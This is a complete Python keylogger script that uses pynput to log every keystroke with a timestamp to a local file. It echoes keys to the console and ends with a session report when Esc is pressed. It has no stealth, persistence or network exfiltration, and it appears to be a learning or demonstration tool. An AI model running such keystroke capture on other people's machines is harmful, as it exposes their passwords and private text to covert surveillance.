from pynput import keyboard
import time

caps_on=False
buffer=[]
total_keys=0
file_name="keystrokes_"+time.strftime("%m-%d(%H_%M_%S)")+".log"
special_chars={
keyboard.Key.space: "[SPACE]",
keyboard.Key.shift: "[SHIFT]",
keyboard.Key.tab: "[TAB]",
keyboard.Key.ctrl_l: "[CTRL]",
keyboard.Key.ctrl_r: "[CTRL]",
keyboard.Key.alt_l: "[ALT]",
keyboard.Key.alt_r: "[ALT]",
keyboard.Key.backspace: "[BACKSPACE]",
keyboard.Key.caps_lock: "[CAPS_LOCK]",
keyboard.Key.delete: "[DELETE]",
keyboard.Key.enter: "[ENTER]",
keyboard.Key.page_down: "[PAGE_DOWN]",
keyboard.Key.page_up: "[PAGE_UP]",
keyboard.Key.home: "[HOME]",
keyboard.Key.up: "[UP]",
keyboard.Key.down: "[DOWN]",
keyboard.Key.left: "[LEFT]",
keyboard.Key.right: "[RIGHT]",
keyboard.Key.num_lock: "[NUM_LOCK]",
keyboard.Key.end: "[END]",
keyboard.Key.insert: "[INSERT]"
}
numpad={
    96: "0",
    97: "1",
    98: "2",
    99: "3",
    100: "4",
    101: "5",
    102: "6",
    103: "7",
    104: "8",
    105: "9",
}
def interpreter(key):
    global caps_on
    try:
        if key.char is not None:
            return key.char
        else:
            return numpad.get(key.vk,"[KEY_NOT_DEFINED]")
    except AttributeError:
        if keyboard.Key.caps_lock==key:
            caps_on=not caps_on
        return special_chars.get(key,"[KEY_NOT_DEFINED]")

def flush():
    with open(file_name,"a") as f:
        f.write("".join(buffer))
        f.flush()
    buffer.clear()

def press(key):
    global total_keys
    total_keys+=1
    k=interpreter(key)
    if (key==keyboard.Key.esc):
        timestamp=time.strftime("%Y/%m/%d %H:%M:%S")
        line=timestamp+" | "+"[ESC]"+"\n"
        print(line)
        buffer.append(line)
        runtime=round(time.time()-start_time,2)
        report="\n----- SESSION REPORT -----\n"
        report+="Total keys pressed: "+str(total_keys)+"\n"
        report+="Total runtime (seconds): "+str(runtime)+"\n"
        report+="--------------------------\n"
        buffer.append(report)
        print(report)
        flush()
        return False    
    if caps_on and k.isalpha():
        k=k.upper()
    timestamp=time.strftime("%Y/%m/%d %H:%M:%S")
    line=timestamp+" | "+k+"\n"
    print(line,end="|")
    buffer.append(line)
    if (len(buffer)>=10):
        flush()
   
start_time=time.time()
with keyboard.Listener(on_press=press) as listener:
    listener.join()